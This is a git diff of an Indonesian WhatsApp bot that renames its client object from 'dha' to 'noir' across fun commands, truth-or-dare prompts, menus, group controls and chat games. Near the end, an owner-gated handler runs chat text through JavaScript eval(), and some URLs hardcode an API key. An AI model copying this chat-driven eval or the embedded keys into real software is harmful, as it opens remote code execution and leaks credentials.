                             const ra = ['0', '4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
                             const te = ra[Math.floor(Math.random() * ra.length)]
-                            dha.sendMessage(from, '*Pertanyaan :* ' + rate + '\n*Jawaban :* ' + te + '%', text, {
+                            noir.sendMessage(from, '*Pertanyaan :* ' + rate + '\n*Jawaban :* ' + te + '%', text, {
                                    quoted: mek
                             })
                             break
@@ -4824,7 +4579,7 @@ Source : ${anu.result.source}
                             ganteng = body.slice(1)
                             const gan = ['10', '30', '20', '40', '50', '60', '70', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
                             const teng = gan[Math.floor(Math.random() * gan.length)]
-                            dha.sendMessage(from, '*Pertanyaan :* ' + ganteng + '\n*Jawaban :* ' + teng + '%', text, {
+                            noir.sendMessage(from, '*Pertanyaan :* ' + ganteng + '\n*Jawaban :* ' + teng + '%', text, {
                                    quoted: mek
                             })
                             break
@@ -4833,13 +4588,13 @@ Source : ${anu.result.source}
                             cantik = body.slice(1)
                             const can = ['10', '30', '20', '40', '50', '60', '70', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
                             const tik = can[Math.floor(Math.random() * can.length)]
-                            dha.sendMessage(from, '*Pertanyaan :* ' + cantik + '\n*Jawaban :* ' + tik + '%', text, {
+                            noir.sendMessage(from, '*Pertanyaan :* ' + cantik + '\n*Jawaban :* ' + tik + '%', text, {
                                    quoted: mek
                             })
                             break
                      case 'cekwatak':
                             var namao = pushname
-                            var prfx = await dha.getProfilePicture(sender)
+                            var prfx = await noir.getProfilePicture(sender)
                             const watak = ['top deh pokoknya', 'penyayang', 'pemurah', 'Pemarah', 'Pemaaf', 'Penurut', 'Baik', 'baperan', 'Baik-Hati', 'penyabar', 'UwU', 'Suka Membantu']
                             const wtk = watak[Math.floor(Math.random() * (watak.length))]
                             const ratenyaasu = ['100%', '95%', '90%', '85%', '80%', '75%', '70%', '65%', '60%', '55%', '50%', '45%', '40%', '35%', '30%', '25%', '20%', '15%', '10%', '5%']
@@ -4857,7 +4612,7 @@ Source : ${anu.result.source}
                      case 'hobby':
                             hobby = body.slice(1)
                             const by = hobby[Math.floor(Math.random() * hobby.length)]
-                            dha.sendMessage(from, 'Pertanyaan : *' + hobby + '*\n\nJawaban : ' + by, text, {
+                            noir.sendMessage(from, 'Pertanyaan : *' + hobby + '*\n\nJawaban : ' + by, text, {
                                    quoted: mek
                             })
                             break
@@ -4865,7 +4620,7 @@ Source : ${anu.result.source}
                             bisakah = body.slice(1)
                             const bisa = ['Bisa', 'Tidak Bisa', 'Coba Ulangi', 'MANA GW TAU']
                             const keh = bisa[Math.floor(Math.random() * bisa.length)]
-                            dha.sendMessage(from, '*Pertanyaan :* ' + bisakah + '\n*Jawaban :* ' + keh, text, {
+                            noir.sendMessage(from, '*Pertanyaan :* ' + bisakah + '\n*Jawaban :* ' + keh, text, {
                                    quoted: mek
                             })
                             break
@@ -4873,7 +4628,7 @@ Source : ${anu.result.source}
                             kapankah = body.slice(1)
                             const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
                             const koh = kapan[Math.floor(Math.random() * kapan.length)]
-                            dha.sendMessage(from, '*Pertanyaan :* ' + kapankah + '\n*Jawaban :* ' + koh, text, {
+                            noir.sendMessage(from, '*Pertanyaan :* ' + kapankah + '\n*Jawaban :* ' + koh, text, {
                                    quoted: mek
                             })
                             break
@@ -4881,7 +4636,7 @@ Source : ${anu.result.source}
                             const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
                             const ttrth = trut[Math.floor(Math.random() * trut.length)]
                             truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
-                            dha.sendMessage(from, truteh, image, {
+                            noir.sendMessage(from, truteh, image, {
                                    caption: '*Truth*\n\n' + ttrth,
                                    quoted: mek
                             })
@@ -4890,7 +4645,7 @@ Source : ${anu.result.source}
                             const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot "??💨" setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
                             const der = dare[Math.floor(Math.random() * dare.length)]
                             buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
-                            dha.sendMessage(from, buffer, image, {
+                            noir.sendMessage(from, buffer, image, {
                                    quoted: mek,
                                    caption: '*Dare*\n\n' + der
                             })
@@ -4949,7 +4704,7 @@ Source : ${anu.result.source}
                             //------------------< Lainnya >-------------------
 
                      case 'ban':
-                            dha.updatePresence(from, Presence.composing)
+                            noir.updatePresence(from, Presence.composing)
                             if (args.length < 1) return
                             if (!isOwner) return reply(mess.only.owner)
                             mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
@@ -4964,17 +4719,17 @@ Source : ${anu.result.source}
                             break
                      case 'getpp':
                             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
-                                   linkpp = await dha.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
+                                   linkpp = await noir.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                                    buffer = await getBuffer(linkpp)
-                                   dha.sendMessage(from, buffer, image, {
+                                   noir.sendMessage(from, buffer, image, {
                                           caption: "Nih",
                                           quoted: mek
                                    })
                             } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
                                    mberr = mek.message.extendedTextMessage.contextInfo.participant
-                                   linkpp = await dha.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
+                                   linkpp = await noir.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                                    buffer = await getBuffer(linkpp)
-                                   dha.sendMessage(from, buffer, image, {
+                                   noir.sendMessage(from, buffer, image, {
                                           quoted: mek,
                                           caption: `Profile Picture of @${mberr.split("@")[0]}`,
                                           contextInfo: {
@@ -4983,9 +4738,9 @@ Source : ${anu.result.source}
                                    })
                             } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
                                    mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
-                                   linkpp = await dha.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
+                                   linkpp = await noir.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                                    buffer = await getBuffer(linkpp)
-                                   dha.sendMessage(from, buffer, image, {
+                                   noir.sendMessage(from, buffer, image, {
                                           quoted: mek,
                                           caption: `Profile Picture of @${mberr.split("@")[0]}`,
                                           contextInfo: {
@@ -4999,7 +4754,7 @@ Source : ${anu.result.source}
                      case 'delete': // MR.CYSER
                             try {
                                    if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot')
-                                   dha.deleteMessage(from, {
+                                   noir.deleteMessage(from, {
                                           id: mek.message.extendedTextMessage.contextInfo.stanzaId,
                                           remoteJid: from,
                                           fromMe: true
@@ -5013,8 +4768,8 @@ Source : ${anu.result.source}
                             break
                      case 'info': // Jangan Di Ubah Plise
                             urlinfo = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            thankslort = `*━━━━INFO BOT━━━━*\n*O>Nama : hzkyx Botz*\n*O>JAM : ${moment().utcOffset('+0700').format('HH:mm')}*\n*O>DATE : ${moment.tz('Asia/Jakarta').format('DD/MM')}*\n*O>Tipe : Node Js*\n*O>Versi : 3.3*\n*━━━━━━━━━━━━━━━*`
-                            dha.sendMessage(from, await getBuffer(urlinfo), image, {
+                            thankslort = `*━━━━INFO BOT━━━━*\n*O>Nama : noir Botz*\n*O>JAM : ${moment().utcOffset('+0700').format('HH:mm')}*\n*O>DATE : ${moment.tz('Asia/Jakarta').format('DD/MM')}*\n*O>Tipe : Node Js*\n*O>Versi : 3.3*\n*━━━━━━━━━━━━━━━*`
+                            noir.sendMessage(from, await getBuffer(urlinfo), image, {
                                    quoted: mek,
                                    caption: thankslort
                             })
@@ -5050,12 +4805,12 @@ Source : ${anu.result.source}
                                           batas = parseInt(sampai) + 1
                                           if (batas > 30) return reply('Maks 30!')
                                           reply(mess.wait)
-                                          cok = await dha.searchMessages(`${ve}`, from, batas, 1)
+                                          cok = await noir.searchMessages(`${ve}`, from, batas, 1)
                                           if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan')
                                           if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
                                           for (i = 1; i < cok.messages.length; i++) {
                                                  if (cok.messages[i].message) {
-                                                        dha.sendMessage(from, `Ditemukan!`, text, {
+                                                        noir.sendMessage(from, `Ditemukan!`, text, {
                                                                sendEphemeral: true,
                                                                quoted: cok.messages[i]
                                                         })
@@ -5073,7 +4828,7 @@ Source : ${anu.result.source}
                             if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`)
                             anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)
                             teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
-                            dha.sendMessage(from, teks, text, {
+                            noir.sendMessage(from, teks, text, {
                                    quoted: troli
                             })
                             break
@@ -5081,13 +4836,13 @@ Source : ${anu.result.source}
                             if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`)
                             teks = args.join(' ')
                             reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
-                            dha.sendMessage('6282287486762@s.whatsapp.net', `*Bug Report:* ${teks}`, text)
+                            noir.sendMessage('6282287486762@s.whatsapp.net', `*Bug Report:* ${teks}`, text)
                             break
                      case 'readall':
                             totalchat.map(async ({
                                    jid
                             }) => {
-                                   await dha.chatRead(jid)
+                                   await noir.chatRead(jid)
                             })
                             reply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
                             console.log(totalchat.length)
@@ -5097,7 +4852,7 @@ Source : ${anu.result.source}
                             if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti KURR GAMTENG`)
                             ct = body.slice(12)
                             zhain = await getBuffer(`https://api.lolhuman.xyz/api/toloserti?apikey=${setting.lolkey}&name=${ct}`)
-                            dha.sendMessage(from, zhain, image, {
+                            noir.sendMessage(from, zhain, image, {
                                    quoted: mek,
                                    caption: 'Nih Dah Jadi'
                             })
@@ -5119,7 +4874,7 @@ Source : ${anu.result.source}
                             ini_txt += `Desc : ${get_result.desc}\n`
                             ini_txt += `Story :\n${get_result.story}\n`
                             thumbnail = await getBuffer(get_result.thumbnail)
-                            dha.sendMessage(from, thumbnail, image, {
+                            noir.sendMessage(from, thumbnail, image, {
                                    quoted: mek,
                                    caption: ini_txt
                             })
@@ -5158,7 +4913,7 @@ Source : ${anu.result.source}
                             teks = args.join(" ")
                             reply('SABAR YA SAYANG....')
                             buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=genbotkey&text=${teks}`)
-                            dha.sendMessage(from, buffer, image, {
+                            noir.sendMessage(from, buffer, image, {
                                    quoted: ftoko,
                                    caption: 'ini hasilnya kak....'
                             })
@@ -5168,7 +4923,7 @@ Source : ${anu.result.source}
                             txt1 = args[0]
                             txt2 = args[1]
                             ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/pornhub?apikey=genbotkey&text1=${txt1}&text2=${txt2}`)
-                            dha.sendMessage(from, ini_anu, image, {
+                            noir.sendMessage(from, ini_anu, image, {
                                    quoted: ftoko
                             })
                             break
@@ -5176,7 +4931,7 @@ Source : ${anu.result.source}
                             if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                             ini_txt = args.join(" ")
                             getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
-                                   dha.sendMessage(from, gambar, image, {
+                                   noir.sendMessage(from, gambar, image, {
                                           quoted: troli
                                    })
                             })
@@ -5185,7 +4940,7 @@ Source : ${anu.result.source}
                             if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                             ini_txt = args.join(" ")
                             getBuffer(`https://api.lolhuman.xyz/api/photooxy1/coffe?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
-                                   dha.sendMessage(from, gambar, image, {
+                                   noir.sendMessage(from, gambar, image, {
                                           quoted: troli,
                                           caption: 'jangan lupa bayar 15.000'
                                    })
@@ -5195,7 +4950,7 @@ Source : ${anu.result.source}
                             if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                             ini_txt = args.join(" ")
                             getBuffer(`https://api.lolhuman.xyz/api/photooxy1/cup1?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
-                                   dha.sendMessage(from, gambar, image, {
+                                   noir.sendMessage(from, gambar, image, {
                                           quoted: troli
                                    })
                             })
@@ -5234,7 +4989,7 @@ Source : ${anu.result.source}
                             if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                             ini_txt = args.join(" ")
                             getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${setting.lolkey}&text=${ini_txt}`).then((gambar) => {
-                                   dha.sendMessage(from, gambar, image, {
+                                   noir.sendMessage(from, gambar, image, {
                                           quoted: ftoko
                                    })
                             })
@@ -5348,10 +5103,10 @@ Source : ${anu.result.source}
                             if (!isBotGroupAdmins) return reply(ind.badmin())
                             if (args[0] === 'buka') {
                                    reply(`*BERHASIL MEMBUKA GROUP*`)
-                                   dha.groupSettingChange(from, GroupSettingChange.messageSend, false)
+                                   noir.groupSettingChange(from, GroupSettingChange.messageSend, false)
                             } else if (args[0] === 'tutup') {
                                    reply(`*BERHASIL MENUTUP GROUP*`)
-                                   dha.groupSettingChange(from, GroupSettingChange.messageSend, true)
+                                   noir.groupSettingChange(from, GroupSettingChange.messageSend, true)
                             }
                             break
                             //------------------< Menunya Bang:v >-------------------
@@ -5371,83 +5126,83 @@ Source : ${anu.result.source}
                             reply('https://chat.whatsapp.com/EymjfVUattCJSGg58WPvrd')
                             break
                      case 'ownermenu':
-                            dha.sendMessage(from, ownerMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, ownerMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'downloadmenu':
-                            dha.sendMessage(from, downloadMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, downloadMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'gamemenu':
-                            dha.sendMessage(from, gameMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, gameMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'rules':
-                            dha.sendMessage(from, rulesBot(prefix), MessageType.text, {
+                            noir.sendMessage(from, rulesBot(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'owner':
-                            dha.sendMessage(from, owner(prefix), MessageType.text, {
+                            noir.sendMessage(from, owner(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'wibumenu':
-                            dha.sendMessage(from, wibuMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, wibuMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'infomenu':
-                            dha.sendMessage(from, infoMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, infoMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'stickermenu':
-                            dha.sendMessage(from, stickerMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, stickerMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'sertimenu':
-                            dha.sendMessage(from, sertiMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, sertiMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'ceritamenu':
-                            dha.sendMessage(from, ceritaMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, ceritaMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'makermenu':
-                            dha.sendMessage(from, makerMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, makerMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'toolsmenu':
-                            dha.sendMessage(from, toolsMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, toolsMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'dewasamenu':
-                            dha.sendMessage(from, dewasaMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, dewasaMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'othermenu':
-                            dha.sendMessage(from, otherMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, otherMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'groupmenu':
                      case 'grupmenu':
-                            dha.sendMessage(from, groupMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, groupMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
                      case 'funmenu':
-                            dha.sendMessage(from, funMenu(prefix), MessageType.text, {
+                            noir.sendMessage(from, funMenu(prefix), MessageType.text, {
                                    quoted: troli
                             })
                             break
@@ -5465,7 +5220,7 @@ Source : ${anu.result.source}
 
 Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
 • Pemenangnya adalah [ @${winR} ] `
-                                          dha.sendMessage(from, starGame, text, {
+                                          noir.sendMessage(from, starGame, text, {
                                                  quoted: troli,
                                                  contextInfo: {
                                                         mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net", ]
@@ -5473,7 +5228,7 @@ Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
                                           })
                                           fs.unlinkSync("./media/" + from + ".json");
                                    } else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'n') {
-                                          dha.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
+                                          noir.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
 • @${gelutSkuy.Y} Menolak🤙🏻`, text, {
                                                  quoted: troli,
                                                  contextInfo: {
@@ -5500,7 +5255,7 @@ Giliran = @${tty.player1.split('@')[0]}
    ${angka[1]}${angka[2]}${angka[3]}
    ${angka[4]}${angka[5]}${angka[6]}
    ${angka[7]}${angka[8]}${angka[9]}`
-                                          dha.sendMessage(from, ucapan, text, {
+                                          noir.sendMessage(from, ucapan, text, {
                                                  quoted: troli,
                                                  contextInfo: {
                                                         mentionedJid: [tty.player1, tty.player2]
@@ -5512,7 +5267,7 @@ Giliran = @${tty.player1.split('@')[0]}
                                           tty = tto[0]
                                           naa = ky_ttt.filter(toek => !toek.id.includes(from))
                                           ky_ttt = naa
-                                          dha.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`, text, {
+                                          noir.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`, text, {
                                                  quoted: troli,
                                                  contextInfo: {
                                                         mentionedJid: [tty.player2]
@@ -5551,7 +5306,7 @@ Giliran = @${tty.player1.split('@')[0]}
 *Hasil Akhir:*
 
 ${ttt}`
-                                          dha.sendMessage(from, ucapan1, text, {
+                                          noir.sendMessage(from, ucapan1, text, {
                                                  quoted: troli,
                                                  contextInfo: {
                                                         mentionedJid: [tty.player1]
@@ -5600,7 +5355,7 @@ Player1 @${tty.player1.split('@')[0]}=❎
 Giliran = @${tty.player2.split('@')[0]}
 
 ${ttt}`
-                                   dha.sendMessage(from, ucapan, text, {
+                                   noir.sendMessage(from, ucapan, text, {
                                           quoted: troli,
                                           contextInfo: {
                                                  mentionedJid: [tty.player1, tty.player2]
@@ -5636,7 +5391,7 @@ ${ttt}`
 *Hasil Akhir:*
 
 ${ttt}`
-                                          dha.sendMessage(from, ucapan1, text, {
+                                          noir.sendMessage(from, ucapan1, text, {
                                                  quoted: troli,
                                                  contextInfo: {
                                                         mentionedJid: [tty.player2]
@@ -5677,7 +5432,7 @@ Player2 @${tty.player2.split('@')[0]}=❎
 Giliran = @${tty.player1.split('@')[0]}
 
 ${ttt}`
-                                   dha.sendMessage(from, ucapan, text, {
+                                   noir.sendMessage(from, ucapan, text, {
                                           quoted: troli,
                                           contextInfo: {
                                                  mentionedJid: [tty.player1, tty.player2]
@@ -5687,7 +5442,7 @@ ${ttt}`
                             if (budy.startsWith('>')) {
                                    if (!mek.key.fromMe && !isOwner) return
                                    try {
-                                          return dha.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, {
+                                          return noir.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, {
                                                  quoted: mek
                                           })
                                    } catch (err) {
@@ -5714,7 +5469,7 @@ ${ttt}`
                             }
                             if (!isGroup && isCmd && !mek.key.fromMe) {
                                    teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
-                                   dha.sendMessage(from, {
+                                   noir.sendMessage(from, {
                                           text: teks,
                                           jpegThumbnail: fs.readFileSync('./media/diablo.png')
                                    }, 'extendedTextMessage', {
